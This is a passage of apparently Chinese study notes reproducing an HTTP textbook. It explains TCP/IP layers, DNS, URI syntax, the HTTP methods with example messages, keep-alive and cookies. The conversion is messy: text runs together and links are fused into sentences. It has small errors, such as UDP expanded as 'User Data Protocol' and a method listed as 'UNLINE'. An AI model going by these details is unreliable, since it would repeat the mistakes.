做了扩展，于是导致在写 HTML 页面时，必须考虑兼容他们两家公司的浏览器。时至今日，这个问题仍令那些写前端页面的工程师感到棘手。在这场浏览器供应商之间的竞争中，他们不仅对当时发展中的各种Web 标准化视而不见，还屡次出现新增功能没有对应说明文档的情况。<br>2000 年前后，这场浏览器战争随着网景通信公司的衰落而暂告一段落。<br>但就在 2004 年，Mozilla 基金会发布了 Firefox 浏览器，第二次浏览器大战随即爆发。Internet Explorer 浏览器的版本从 6 升到 7 前后花费了 5 年时间。之后接连不断地发布了 8、9、10 版本。另外，Chrome、Opera、Safari 等浏览器也纷纷抢占市场份额。</p><h2 id="HTTP的诞生背景是什么HTTP-诞生的背景制定-HTTP-的初衷"><a href="#HTTP的诞生背景是什么HTTP-诞生的背景制定-HTTP-的初衷" class="headerlink" title="HTTP的诞生背景是什么HTTP 诞生的背景制定 HTTP 的初衷"></a>HTTP的诞生背景是什么HTTP 诞生的背景制定 HTTP 的初衷</h2><h2 id="当我们在网页浏览器（Web-browser）的地址栏中输入-URL时，Web-页面是如何呈现的吗？"><a href="#当我们在网页浏览器（Web-browser）的地址栏中输入-URL时，Web-页面是如何呈现的吗？" class="headerlink" title="当我们在网页浏览器（Web browser）的地址栏中输入 URL时，Web 页面是如何呈现的吗？"></a>当我们在网页浏览器（Web browser）的地址栏中输入 URL时，Web 页面是如何呈现的吗？</h2><p>Web 页面当然不能凭空显示出来。根据 Web 浏览器地址栏中指定的URL，Web 浏览器从 Web 服务器端获取文件资源（resource）等信息，从而显示出 Web 页面。</p><h2 id="定义式"><a href="#定义式" class="headerlink" title="定义式"></a>定义式</h2><p>客户端：像这种通过发送请求获取服务器资源的 Web 浏览器等，都可称为客户端（client）。<br>协议是指规则的约定。<br>NCSA（National Center forSupercomputer Applications，美国国家超级计算机应用中心）<br>SGML（Standard Generalized Markup Language，标准通用标记语言）。<br>HTML（HyperText Markup Language，超文本标记语言）。<br>把SGML作为页面的文本标记语言。<br>HTTP，HyperText Transfer Protocol，超文本传输协议。作为文档传递协议的 HTTP 。通常被译为超文本传输协议，但这种译法并不严谨。严谨的译名应该为“超文本转移协议”。但是前一译法已约定俗成，本书将会沿用。有兴趣的读者可参考图灵社区的相关讨论 ：<a href="http://www.ituring.com.cn/article/1817。" target="_blank" rel="noopener">http://www.ituring.com.cn/article/1817。</a><br>指定文档所在地址的 URL（Uniform Resource Locator，统一资源定位符）。<br>WWW 这一名称，是 Web 浏览器当年用来浏览超文本的客户端应用程序时的名称。现在则用来表示这一系列的集合，也可简称为 Web。</p><h2 id="分类式"><a href="#分类式" class="headerlink" title="分类式"></a>分类式</h2><p>现在已提出了 3 项 WWW 构建技术，分别是：HTML、HTTP、URL</p><h2 id="对比式"><a href="#对比式" class="headerlink" title="对比式"></a>对比式</h2><h2 id="关系式"><a href="#关系式" class="headerlink" title="关系式"></a>关系式</h2><p>Web 是建立在 HTTP 协议上通信的。<br>Web 使用一种名为 HTTP的协议作为规范，完成从客户端到服务器端等一系列运作流程。<br>目的：<br>1.2.3　驻足不前的 HTTPHTTP/0.9HTTP 于 1990 年问世。那时的 HTTP 并没有作为正式的标准被建立。现在的 HTTP 其实含有 HTTP1.0 之前版本的意思，因此被称为HTTP/0.9。HTTP/1.0HTTP 正式作为标准被公布是在 1996 年的 5 月，版本被命名为HTTP/1.0，并记载于 RFC1945。虽说是初期标准，但该协议标准至今仍被广泛使用在服务器端。RFC1945 - Hypertext Transfer Protocol – HTTP/1.0<a href="http://www.ietf.org/rfc/rfc1945.txtHTTP/1.1141997" target="_blank" rel="noopener">http://www.ietf.org/rfc/rfc1945.txtHTTP/1.1141997</a> 年 1 月公布的 HTTP/1.1 是目前主流的 HTTP 协议版本。当初的标准是 RFC2068，之后发布的修订版 RFC2616 就是当前的最新版本。RFC2616 - Hypertext Transfer Protocol – HTTP/1.1<a href="http://www.ietf.org/rfc/rfc2616.txt可见，作为" target="_blank" rel="noopener">http://www.ietf.org/rfc/rfc2616.txt可见，作为</a> Web 文档传输协议的 HTTP，它的版本几乎没有更新。新一代 HTTP/2.0 正在制订中，但要达到较高的使用覆盖率，仍需假以时日。当年 HTTP 协议的出现主要是为了解决文本传输的难题。由于协议本身非常简单，于是在此基础上设想了很多应用方法并投入了实际使用。现在 HTTP 协议已经超出了 Web 这个框架的局限，被运用到了各种场景里。1.3　网络基础 TCP/IP为了理解 HTTP，我们有必要事先了解一下 TCP/IP 协议族。通常使用的网络（包括互联网）是在 TCP/IP 协议族的基础上运作的。而 HTTP 属于它内部的一个子集。接下来，我们仅介绍理解 HTTP 所需掌握的 TCP/IP 协议族的概要。若想进一步学习有关 TCP/IP 的知识，请参考其他讲解 TCP/IP 的专业书籍。1.3.1　TCP/IP 协议族计算机与网络设备要相互通信，双方就必须基于相同的方法。比如，如何探测到通信目标、由哪一边先发起通信、使用哪种语言进行通信、怎样结束通信等规则都需要事先确定。不同的硬件、操作系统之间的通信，所有的这一切都需要一种规则。而我们就把这种规则称为协议（protocol）。15图：TCP/IP 是互联网相关的各类协议族的总称协议中存在各式各样的内容。从电缆的规格到 IP 地址的选定方法、寻找异地用户的方法、双方建立通信的顺序，以及 Web 页面显示需要处理的步骤，等等。像这样把与互联网相关联的协议集合起来总称为 TCP/IP。也有说法认为，TCP/IP 是指 TCP 和 IP 这两种协议。还有一种说法认为，TCP/IP 是在 IP 协议的通信过程中，使用到的协议族的统称。1.3.2　TCP/IP 的分层管理TCP/IP 协议族里重要的一点就是分层。TCP/IP 协议族按层次分别分为以下 4 层：应用层、传输层、网络层和数据链路层。把 TCP/IP 层次化是有好处的。比如，如果互联网只由一个协议统筹，某个地方需要改变设计时，就必须把所有部分整体替换掉。而分层之后只需把变动的层替换掉即可。把各层之间的接口部分规划好之后，每个层次内部的设计就能够自由改动了。值得一提的是，层次化之后，设计也变得相对简单了。处于应用层上的应用可以只考虑分派给自己的任务，而不需要弄清对方在地球上哪个地方、对方的传输路线是怎样的、是否能确保传输送达等问题。TCP/IP 协议族各层的作用如下。应用层16应用层决定了向用户提供应用服务时通信的活动。TCP/IP 协议族内预存了各类通用的应用服务。比如，FTP（FileTransfer Protocol，文件传输协议）和 DNS（Domain Name System，域名系统）服务就是其中两类。HTTP 协议也处于该层。传输层传输层对上层应用层，提供处于网络连接中的两台计算机之间的数据传输。在传输层有两个性质不同的协议：TCP（Transmission ControlProtocol，传输控制协议）和 UDP（User Data Protocol，用户数据报协议）。网络层（又名网络互连层）网络层用来处理在网络上流动的数据包。数据包是网络传输的最小数据单位。该层规定了通过怎样的路径（所谓的传输路线）到达对方计算机，并把数据包传送给对方。与对方计算机之间通过多台计算机或网络设备进行传输时，网络层所起的作用就是在众多的选项内选择一条传输路线。链路层（又名数据链路层，网络接口层）用来处理连接网络的硬件部分。包括控制操作系统、硬件的设备驱动、NIC（Network Interface Card，网络适配器，即网卡），及光纤等物理可见部分（还包括连接器等一切传输媒介）。硬件上的范畴均在链路层的作用范围之内。1.3.3　TCP/IP 通信传输流17利用 TCP/IP 协议族进行网络通信时，会通过分层顺序与对方进行通信。发送端从应用层往下走，接收端则往应用层往上走。我们用 HTTP 举例来说明，首先作为发送端的客户端在应用层（HTTP 协议）发出一个想看某个 Web 页面的 HTTP 请求。接着，为了传输方便，在传输层（TCP 协议）把从应用层处收到的数据（HTTP 请求报文）进行分割，并在各个报文上打上标记序号及端口号后转发给网络层。在网络层（IP 协议），增加作为通信目的地的 MAC 地址后转发给链路层。这样一来，发往网络的通信请求就准备齐全了。接收端的服务器在链路层接收到数据，按序往上层发送，一直到应用层。当传输到应用层，才能算真正接收到由客户端发送过来的 HTTP请求。18发送端在层与层之间传输数据时，每经过一层时必定会被打上一个该层所属的首部信息。反之，接收端在层与层传输数据时，每经过一层时会把对应的首部消去。这种把数据信息包装起来的做法称为封装（encapsulate）。1.4　与 HTTP 关系密切的协议 : IP、TCP 和DNS下面我们分别针对在 TCP/IP 协议族中与 HTTP 密不可分的 3 个协议（IP、TCP 和 DNS）进行说明。1.4.1　负责传输的 IP 协议19按层次分，IP（Internet Protocol）网际协议位于网络层。InternetProtocol 这个名称可能听起来有点夸张，但事实正是如此，因为几乎所有使用网络的系统都会用到 IP 协议。TCP/IP 协议族中的 IP 指的就是网际协议，协议名称中占据了一半位置，其重要性可见一斑。可能有人会把“IP”和“IP 地址”搞混，“IP”其实是一种协议的名称。IP 协议的作用是把各种数据包传送给对方。而要保证确实传送到对方那里，则需要满足各类条件。其中两个重要的条件是 IP 地址和 MAC地址（Media Access Control Address）。IP 地址指明了节点被分配到的地址，MAC 地址是指网卡所属的固定地址。IP 地址可以和 MAC 地址进行配对。IP 地址可变换，但 MAC地址基本上不会更改。使用 ARP 协议凭借 MAC 地址进行通信IP 间的通信依赖 MAC 地址。在网络上，通信的双方在同一局域网（LAN）内的情况是很少的，通常是经过多台计算机和网络设备中转才能连接到对方。而在进行中转时，会利用下一站中转设备的 MAC地址来搜索下一个中转目标。这时，会采用 ARP 协议（AddressResolution Protocol）。ARP 是一种用以解析地址的协议，根据通信方的 IP 地址就可以反查出对应的 MAC 地址。没有人能够全面掌握互联网中的传输状况在到达通信目标前的中转过程中，那些计算机和路由器等网络设备只能获悉很粗略的传输路线。这种机制称为路由选择（routing），有点像快递公司的送货过程。想要寄快递的人，只要将自己的货物送到集散中心，就可以知道快递公司是否肯收件发货，该快递公司的集散中心检查货物的送达地址，明确下站该送往哪个区域的集散中心。接着，那个区域的集散中心自会判断是否能送到对方的家中。我们是想通过这个比喻说明，无论哪台计算机、哪台网络设备，它们都无法全面掌握互联网中的细节。201.4.2　确保可靠性的 TCP 协议按层次分，TCP 位于传输层，提供可靠的字节流服务。所谓的字节流服务（Byte Stream Service）是指，为了方便传输，将大块数据分割成以报文段（segment）为单位的数据包进行管理。而可靠的传输服务是指，能够把数据准确可靠地传给对方。一言以蔽之，TCP 协议为了更容易传送大数据才把数据分割，而且 TCP 协议能够确认数据最终是否送达到对方。确保数据能到达目标为了准确无误地将数据送达目标处，TCP 协议采用了三次握手（three-way handshaking）策略。用 TCP 协议把数据包送出去后，TCP不会对传送后的情况置之不理，它一定会向对方确认是否成功送达。21握手过程中使用了 TCP 的标志（flag） —— SYN（synchronize） 和ACK（acknowledgement）。发送端首先发送一个带 SYN 标志的数据包给对方。接收端收到后，回传一个带有 SYN/ACK 标志的数据包以示传达确认信息。最后，发送端再回传一个带 ACK 标志的数据包，代表“握手”结束。若在握手过程中某个阶段莫名中断，TCP 协议会再次以相同的顺序发送相同的数据包。除了上述三次握手，TCP 协议还有其他各种手段来保证通信的可靠性。1.5　负责域名解析的 DNS 服务DNS（Domain Name System）服务是和 HTTP 协议一样位于应用层的协议。它提供域名到 IP 地址之间的解析服务。计算机既可以被赋予 IP 地址，也可以被赋予主机名和域名。比如<a href="http://www.hackr.jp。用户通常使用主机名或域名来访问对方的计算机，而不是直接通过" target="_blank" rel="noopener">www.hackr.jp。用户通常使用主机名或域名来访问对方的计算机，而不是直接通过</a> IP地址访问。因为与 IP 地址的一组纯数字相比，用字母配合数字的表示形式来指定计算机名更符合人类的记忆习惯。22但要让计算机去理解名称，相对而言就变得困难了。因为计算机更擅长处理一长串数字。为了解决上述的问题，DNS 服务应运而生。DNS 协议提供通过域名查找 IP 地址，或逆向从 IP 地址反查域名的服务。1.6　各种协议与 HTTP 协议的关系学习了和 HTTP 协议密不可分的 TCP/IP 协议族中的各种协议后，我们再通过这张图来了解下 IP 协议、TCP 协议和 DNS 服务在使用HTTP 协议的通信过程中各自发挥了哪些作用。23241.7　URI 和 URL与 URI（统一资源标识符）相比，我们更熟悉 URL（UniformResource Locator，统一资源定位符）。URL 正是使用 Web 浏览器等访问 Web 页面时需要输入的网页地址。比如，下图的 <a href="http://hackr.jp/就是" target="_blank" rel="noopener">http://hackr.jp/就是</a> URL。1.7.1　统一资源标识符URI 是 Uniform Resource Identifier 的缩写。RFC2396 分别对这 3 个单词进行了如下定义。Uniform规定统一的格式可方便处理多种不同类型的资源，而不用根据上下文环境来识别资源指定的访问方式。另外，加入新增的协议方案（如http: 或 ftp:）也更容易。Resource资源的定义是“可标识的任何东西”。除了文档文件、图像或服务（例如当天的天气预报）等能够区别于其他类型的，全都可作为资源。另外，资源不仅可以是单一的，也可以是多数的集合体。Identifier表示可标识的对象。也称为标识符。综上所述，URI 就是由某个协议方案表示的资源的定位标识符。协议方案是指访问资源所使用的协议类型名称。采用 HTTP 协议时，协议方案就是 http。除此之外，还有 ftp、25mailto、telnet、file 等。标准的 URI 协议方案有 30 种左右，由隶属于国际互联网资源管理的非营利社团 ICANN（Internet Corporation forAssigned Names and Numbers，互联网名称与数字地址分配机构）的IANA（Internet Assigned Numbers Authority，互联网号码分配局）管理颁布。IANA - Uniform Resource Identifier (URI) SCHEMES（统一资源标识符方案）<a href="http://www.iana.org/assignments/uri-schemesURI" target="_blank" rel="noopener">http://www.iana.org/assignments/uri-schemesURI</a> 用字符串标识某一互联网资源，而 URL 表示资源的地点（互联网上所处的位置）。可见 URL 是 URI 的子集。“RFC3986：统一资源标识符（URI）通用语法”中列举了几种 URI 例子，如下所示。<a href="ftp://ftp.is.co.za/rfc/rfc1808.txthttp://www.ietf.org/rfc/rfc2396.txtldap://[2001:db8::7]/c=GB?objectClass?onemailto:John.Doe@example.comnews:comp.infosystems.www.servers.unixtel:+1-816-555-1212telnet://192.0.2.16:80/urn:oasis:names:specification:docbook:dtd:xml:4.1.2本书接下来的章节中会频繁出现" target="_blank" rel="noopener">ftp://ftp.is.co.za/rfc/rfc1808.txthttp://www.ietf.org/rfc/rfc2396.txtldap://[2001:db8::7]/c=GB?objectClass?onemailto:John.Doe@example.comnews:comp.infosystems.www.servers.unixtel:+1-816-555-1212telnet://192.0.2.16:80/urn:oasis:names:specification:docbook:dtd:xml:4.1.2本书接下来的章节中会频繁出现</a> URI 这个术语，在充分理解的基础上，也可用 URL 替换 URI。1.7.2　URI 格式表示指定的 URI，要使用涵盖全部必要信息的绝对 URI、绝对 URL 以及相对 URL。相对 URL，是指从浏览器中基本 URI 处指定的 URL，形如 /image/logo.gif。让我们先来了解一下绝对 URI 的格式。26使用 http: 或 https: 等协议方案名获取访问资源时要指定协议类型。不区分字母大小写，最后附一个冒号（:）。也可使用 data: 或 javascript: 这类指定数据或脚本程序的方案名。登录信息（认证）指定用户名和密码作为从服务器端获取资源时必要的登录信息（身份认证）。此项是可选项。服务器地址使用绝对 URI 必须指定待访问的服务器地址。地址可以是类似hackr.jp 这种 DNS 可解析的名称，或是 192.168.1.1 这类 IPv4 地址名，还可以是 [0:0:0:0:0:0:0:1] 这样用方括号括起来的 IPv6 地址名。服务器端口号指定服务器连接的网络端口号。此项也是可选项，若用户省略则自动使用默认端口号。带层次的文件路径指定服务器上的文件路径来定位特指的资源。这与 UNIX 系统的文件目录结构相似。查询字符串针对已指定的文件路径内的资源，可以使用查询字符串传入任意参数。此项可选。片段标识符使用片段标识符通常可标记出已获取资源中的子资源（文档内的某个位置）。但在 RFC 中并没有明确规定其使用方法。该项也为可选项。27并不是所有的应用程序都符合 RFC有一些用来制定 HTTP 协议技术标准的文档，它们被称为RFC（Request for Comments，征求修正意见书）。通常，应用程序会遵照由 RFC 确定的标准实现。可以说，RFC 是互联网的设计文档，要是不按照 RFC 标准执行，就有可能导致无法通信的状况。比如，有一台 Web 服务器内的应用服务没有遵照RFC 的标准实现，那 Web 浏览器就很可能无法访问这台服务器了。由于不遵照 RFC 标准实现就无法进行 HTTP 协议通信，所以基本上客户端和服务器端都会以 RFC 为标准来实现 HTTP 协议。但也存在某些应用程序因客户端或服务器端的不同，而未遵照 RFC 标准，反而将自成一套的“标准”扩展的情况。不按 RFC 标准来实现，当然也不必劳心费力让自己的“标准”符合其他所有的客户端和服务器端。但设想一下，如果这款应用程序的使用者非常多，那会发生什么情况？不难想象，其他的客户端或服务器端必然都不得不去配合它。实际在互联网上，已经实现了 HTTP 协议的一些服务器端和客户端里就存在上述情况。说不定它们会与本书介绍的 HTTP 协议的实现情况不一样。本书接下来要介绍的 HTTP 协议内容，除去部分例外，基本上都以RFC 的标准为准。28第 2 章　简单的 HTTP 协议本章将针对 HTTP 协议结构进行讲解，主要使用HTTP/1.1版本。学完这章，想必大家就能理解 HTTP 协议的基础了。2.1　HTTP 协议用于客户端和服务器端之间的通信HTTP 协议和 TCP/IP 协议族内的其他众多的协议相同，用于客户端和服务器之间的通信。请求访问文本或图像等资源的一端称为客户端，而提供资源响应的一端称为服务器端。29图：应用 HTTP 协议时，必定是一端担任客户端角色，另一端担任服务器端角色在两台计算机之间使用 HTTP 协议通信时，在一条通信线路上必定有一端是客户端，另一端则是服务器端。有时候，按实际情况，两台计算机作为客户端和服务器端的角色有可能会互换。但就仅从一条通信路线来说，服务器端和客户端的角色是确定的，而用 HTTP 协议能够明确区分哪端是客户端，哪端是服务器端。2.2　通过请求和响应的交换达成通信图：请求必定由客户端发出，而服务器端回复响应HTTP 协议规定，请求从客户端发出，最后服务器端响应该请求并返回。换句话说，肯定是先从客户端开始建立通信的，服务器端在没有接收到请求之前不会发送响应。下面，我们来看一个具体的示例。30下面则是从客户端发送给某个 HTTP 服务器端的请求报文中的内容。GET /index.htm HTTP/1.1Host: hackr.jp起始行开头的GET表示请求访问服务器的类型，称为方法（method）。随后的字符串 /index.htm 指明了请求访问的资源对象，也叫做请求 URI（request-URI）。最后的 HTTP/1.1，即 HTTP 的版本号，用来提示客户端使用的 HTTP 协议功能。综合来看，这段请求内容的意思是：请求访问某台 HTTP 服务器上的/index.htm 页面资源。请求报文是由请求方法、请求 URI、协议版本、可选的请求首部字段和内容实体构成的。31图：请求报文的构成请求首部字段及内容实体稍后会作详细说明。接下来，我们继续讲解。接收到请求的服务器，会将请求内容的处理结果以响应的形式返回。HTTP/1.1 200 OKDate: Tue, 10 Jul 2012 06:50:15 GMTContent-Length: 362Content-Type: text/html<html>……在起始行开头的 HTTP/1.1 表示服务器对应的 HTTP 版本。紧挨着的 200 OK 表示请求的处理结果的状态码（status code）和原因短语（reason-phrase）。下一行显示了创建响应的日期时间，是首部字段（header field）内的一个属性。接着以一空行分隔，之后的内容称为资源实体的主体（entitybody）。响应报文基本上由协议版本、状态码（表示请求成功或失败的数字代码）、用以解释状态码的原因短语、可选的响应首部字段以及实体主体构成。稍后我们会对这些内容进行详细说明。32图：响应报文的构成2.3　HTTP 是不保存状态的协议HTTP 是一种不保存状态，即无状态（stateless）协议。HTTP 协议自身不对请求和响应之间的通信状态进行保存。也就是说在 HTTP 这个级别，协议对于发送过的请求或响应都不做持久化处理。图：HTTP 协议自身不具备保存之前发送过的请求或响应的功能使用 HTTP 协议，每当有新的请求发送时，就会有对应的新响应产生。协议本身并不保留之前一切的请求或响应报文的信息。这是为了更快地处理大量事务，确保协议的可伸缩性，而特意把 HTTP 协议设计成如此简单的。可是，随着 Web 的不断发展，因无状态而导致业务处理变得棘手的情况增多了。比如，用户登录到一家购物网站，即使他跳转到该站的33其他页面后，也需要能继续保持登录状态。针对这个实例，网站为了能够掌握是谁送出的请求，需要保存用户的状态。HTTP/1.1 虽然是无状态协议，但为了实现期望的保持状态功能，于是引入了 Cookie 技术。有了 Cookie 再用 HTTP 协议通信，就可以管理状态了。有关 Cookie 的详细内容稍后讲解。2.4　请求 URI 定位资源HTTP 协议使用 URI 定位互联网上的资源。正是因为 URI 的特定功能，在互联网上任意位置的资源都能访问到。图：HTTP 协议使用 URI 让客户端定位到资源当客户端请求访问资源而发送请求时，URI 需要将作为请求报文中的请求 URI 包含在内。指定请求 URI 的方式有很多。34图：以 <a href="http://hackr.jp/index.htm" target="_blank" rel="noopener">http://hackr.jp/index.htm</a> 作为请求的例子除此之外，如果不是访问特定资源而是对服务器本身发起请求，可以用一个 <em> 来代替请求 URI。下面这个例子是查询 HTTP 服务器端支持的 HTTP 方法种类。OPTIONS </em> HTTP/1.12.5　告知服务器意图的 HTTP 方法下面，我们介绍 HTTP/1.1 中可使用的方法。GET ：获取资源GET 方法用来请求访问已被 URI 识别的资源。指定的资源经服务器端解析后返回响应内容。也就是说，如果请求的资源是文本，那就保持原样返回；如果是像 CGI（Common Gateway Interface，通用网关接口）那样的程序，则返回经过执行后的输出结果。使用 GET 方法的请求·响应的例子35请求GET /index.html HTTP/1.1Host: <a href="http://www.hackr.jp响应" target="_blank" rel="noopener">www.hackr.jp响应</a> 返回 index.html 的页面资源请求GET /index.html HTTP/1.1Host: <a href="http://www.hackr.jpIf-Modified-Since" target="_blank" rel="noopener">www.hackr.jpIf-Modified-Since</a>: Thu, 12 Jul 2012 07:30:00 GMT响应仅返回2012年7 月12日7 点30分以后更新过的index.html页面资源。如果未有内容更新，则以状态码304 Not Modified作为响应返回POST：传输实体主体POST 方法用来传输实体的主体。虽然用 GET 方法也可以传输实体的主体，但一般不用 GET 方法进行传输，而是用 POST 方法。虽说 POST 的功能与 GET 很相似，但POST 的主要目的并不是获取响应的主体内容。使用 POST 方法的请求·响应的例子请求POST /submit.cgi HTTP/1.1Host: <a href="http://www.hackr.jpContent-Length" target="_blank" rel="noopener">www.hackr.jpContent-Length</a>: 1560（1560字节的数据）响应 返回 submit.cgi 接收数据的处理结果PUT：传输文件PUT 方法用来传输文件。就像 FTP 协议的文件上传一样，要求在请求报文的主体中包含文件内容，然后保存到请求 URI 指定的位置。36但是，鉴于 HTTP/1.1 的 PUT 方法自身不带验证机制，任何人都可以上传文件 , 存在安全性问题，因此一般的 Web 网站不使用该方法。若配合 Web 应用程序的验证机制，或架构设计采用REST（REpresentational State Transfer，表征状态转移）标准的同类Web 网站，就可能会开放使用 PUT 方法。使用 PUT 方法的请求·响应的例子请求PUT /example.html HTTP/1.1Host: <a href="http://www.hackr.jpContent-Type" target="_blank" rel="noopener">www.hackr.jpContent-Type</a>: text/htmlContent-Length: 1560（1560 字节的数据）响应 1响应返回状态码 204 No Content（比如 ：该 html 已存在于服务器上）1 响应的意思其实是请求执行成功了，但无数据返回。——译者注HEAD：获得报文首部HEAD 方法和 GET 方法一样，只是不返回报文主体部分。用于确认URI 的有效性及资源更新的日期时间等。图：和 GET 一样，但不返回报文主体37使用 HEAD 方法的请求·响应的例子请求HEAD /index.html HTTP/1.1Host: <a href="http://www.hackr.jp响应" target="_blank" rel="noopener">www.hackr.jp响应</a> 返回index.html有关的响应首部DELETE：删除文件DELETE 方法用来删除文件，是与 PUT 相反的方法。DELETE 方法按请求 URI 删除指定的资源。但是，HTTP/1.1 的 DELETE 方法本身和 PUT 方法一样不带验证机制，所以一般的 Web 网站也不使用 DELETE 方法。当配合 Web 应用程序的验证机制，或遵守 REST 标准时还是有可能会开放使用的。使用 DELETE 方法的请求·响应的例子请求DELETE /example.html HTTP/1.1Host: <a href="http://www.hackr.jp响应" target="_blank" rel="noopener">www.hackr.jp响应</a> 响应返回状态码 204 No Content（比如 ：该 html 已从该服务器上删除）OPTIONS：询问支持的方法OPTIONS 方法用来查询针对请求 URI 指定的资源支持的方法。38使用 OPTIONS 方法的请求·响应的例子请求OPTIONS <em> HTTP/1.1Host: <a href="http://www.hackr.jp响应HTTP/1.1" target="_blank" rel="noopener">www.hackr.jp响应HTTP/1.1</a> 200 OKAllow: GET, POST, HEAD, OPTIONS（返回服务器支持的方法）TRACE：追踪路径TRACE 方法是让 Web 服务器端将之前的请求通信环回给客户端的方法。发送请求时，在 Max-Forwards 首部字段中填入数值，每经过一个服务器端就将该数字减 1，当数值刚好减到 0 时，就停止继续传输，最后接收到请求的服务器端则返回状态码 200 OK 的响应。客户端通过 TRACE 方法可以查询发送出去的请求是怎样被加工修改/ 篡改的。这是因为，请求想要连接到源目标服务器可能会通过代理中转，TRACE 方法就是用来确认连接过程中发生的一系列操作。但是，TRACE 方法本来就不怎么常用，再加上它容易引发XST（Cross-Site Tracing，跨站追踪）攻击，通常就更不会用到了。使用 TRACE 方法的请求·响应的例子请求TRACE / HTTP/1.1Host: hackr.jpMax-Forwards: 2HTTP/1.1 200 OKContent-Type: message/http39响应Content-Length: 1024TRACE / HTTP/1.1Host: hackr.jpMax-Forwards: 2（返回响应包含请求内容）CONNECT：要求用隧道协议连接代理CONNECT 方法要求在与代理服务器通信时建立隧道，实现用隧道协议进行 TCP 通信。主要使用 SSL（Secure Sockets Layer，安全套接层）和 TLS（Transport Layer Security，传输层安全）协议把通信内容加 密后经网络隧道传输。CONNECT 方法的格式如下所示。CONNECT 代理服务器名:端口号 HTTP版本使用 CONNECT 方法的请求·响应的例子请求CONNECT proxy.hackr.jp:8080 HTTP/1.1Host: proxy.hackr.jp响应 HTTP/1.1 200 OK（之后进入网络隧道）2.6　使用方法下达命令向请求 URI 指定的资源发送请求报文时，采用称为方法的命令。方法的作用在于，可以指定请求的资源按期望产生某种行为。方法中有 GET、POST 和 HEAD 等。40下表列出了 HTTP/1.0 和 HTTP/1.1 支持的方法。另外，方法名区分大小写，注意要用大写字母。表 2-1：HTTP/1.0 和 HTTP/1.1 支持的方法方法 说明 支持的 HTTP 协议版本GET 获取资源 1.0、1.1POST 传输实体主体 1.0、1.1PUT 传输文件 1.0、1.1HEAD 获得报文首部 1.0、1.1DELETE 删除文件 1.0、1.1OPTIONS 询问支持的方法 1.1TRACE 追踪路径 1.1CONNECT 要求用隧道协议连接代理 1.1LINK 建立和资源之间的联系 1.0UNLINE 断开连接关系 1.0在这里列举的众多方法中，LINK 和 UNLINK 已被 HTTP/1.1 废弃，不再支持。2.7　持久连接节省通信量HTTP 协议的初始版本中，每进行一次 HTTP 通信就要断开一次 TCP连接。41以当年的通信情况来说，因为都是些容量很小的文本传输，所以即使这样也没有多大问题。可随着 HTTP 的普及，文档中包含大量图片的情况多了起来。比如，使用浏览器浏览一个包含多张图片的 HTML 页面时，在发送请求访问 HTML 页面资源的同时，也会请求该 HTML 页面里包含的其他资源。因此，每次的请求都会造成无谓的 TCP 连接建立和断开，增加通信量的开销。422.7.1　持久连接为解决上述 TCP 连接的问题，HTTP/1.1 和一部分的 HTTP/1.0 想出了持久连接（HTTP Persistent Connections，也称为 HTTP keep-alive 或HTTP connection reuse）的方法。持久连接的特点是，只要任意一端没有明确提出断开连接，则保持 TCP 连接状态。43图：持久连接旨在建立 1 次 TCP 连接后进行多次请求和响应的交互持久连接的好处在于减少了 TCP 连接的重复建立和断开所造成的额外开销，减轻了服务器端的负载。另外，减少开销的那部分时间，使HTTP 请求和响应能够更早地结束，这样 Web 页面的显示速度也就相应提高了。在 HTTP/1.1 中，所有的连接默认都是持久连接，但在 HTTP/1.0 内并未标准化。虽然有一部分服务器通过非标准的手段实现了持久连接，但服务器端不一定能够支持持久连接。毫无疑问，除了服务器端，客户端也需要支持持久连接。2.7.2　管线化持久连接使得多数请求以管线化（pipelining）方式发送成为可能。从前发送请求后需等待并收到响应，才能发送下一个请求。管线化技术出现后，不用等待响应亦可直接发送下一个请求。44这样就能够做到同时并行发送多个请求，而不需要一个接一个地等待响应了。图：不等待响应，直接发送下一个请求比如，当请求一个包含 10 张图片的 HTML Web 页面，与挨个连接相比，用持久连接可以让请求更快结束。而管线化技术则比持久连接还要快。请求数越多，时间差就越明显。2.8　使用 Cookie 的状态管理HTTP 是无状态协议，它不对之前发生过的请求和响应的状态进行管理。也就是说，无法根据之前的状态进行本次的请求处理。假设要求登录认证的 Web 页面本身无法进行状态的管理（不记录已登录的状态），那么每次跳转新页面不是要再次登录，就是要在每次请求报文中附加参数来管理登录状态。不可否认，无状态协议当然也有它的优点。由于不必保存状态，自然可减少服务器的 CPU 及内存资源的消耗。从另一侧面来说，也正是因为 HTTP 协议本身是非常简单的，所以才会被应用在各种场景里。45图：如果让服务器管理全部客户端状态则会成为负担保留无状态协议这个特征的同时又要解决类似的矛盾问题，于是引入了 Cookie 技术。Cookie 技术通过在请求和响应报文中写入 Cookie 信息来控制客户端的状态。Cookie 会根据从服务器端发送的响应报文内的一个叫做 Set-Cookie 的首部字段信息，通知客户端保存 Cookie。当下次客户端再往该服务器发送请求时，客户端会自动在请求报文中加入 Cookie 值后发送出去。服务器端发现客户端发送过来的 Cookie 后，会去检查究竟是从哪一个客户端发来的连接请求，然后对比服务器上的记录，最后得到之前的状态信息。没有 Cookie 信息状态下的请求46第 2 次以后（存有 Cookie 信息状态）的请求上图展示了发生 Cookie 交互的情景，HTTP 请求报文和响应报文的内容如下。1. 请求报文（没有 Cookie 信息的状态）GET /reader/ HTTP/1.1Host: hackr.jp</em>首部字段内没有Cookie的相关信息2. 响应报文（服务器端生成 Cookie 信息）HTTP/1.1 200 OKDate: Thu, 12 Jul 2012 07:12:20 GMTServer: Apache＜Set-Cookie: sid=1342077140226724; path=/; expires=Wed,10-Oct-12 07:12:20 GMT＞Content-Type: text/plain; charset=UTF-83. 请求报文（自动发送保存着的 Cookie 信息）GET /image/ HTTP/1.1Host: hackr.jpCookie: sid=1342077140226724有关请求报文和响应报文内 Cookie 对应的首部字段，请参考之后的章节。47第 3 章　HTTP 报文内的 HTTP信息HTTP 通信过程包括从客户端发往服务器端的请求及从服务器端返回客户端的响应。本章就让我们来了解一下请求和响应是怎样运作的。3.1　HTTP 报文用于 HTTP 协议交互的信息被称为 HTTP 报文。请求端（客户端）的HTTP 报文叫做请求报文，响应端（服务器端）的叫做响应报文。HTTP 报文本身是由多行（用 CR+LF 作换行符）数据构成的字符串文本。HTTP 报文大致可分为报文首部和报文主体两块。两者由最初出现的空行（CR+LF）来划分。通常，并不一定要有报文主体。48图：HTTP 报文的结构3.2　请求报文及响应报文的结构我们来看一下请求报文和响应报文的结构。图：请求报文（上）和响应报文（下）的结构49图：请求报文（上）和响应报文（下）的实例请求报文和响应报文的首部内容由以下数据组成。现在出现的各种首部字段及状态码稍后会进行阐述。请求行包含用于请求的方法，请求 URI 和 HTTP 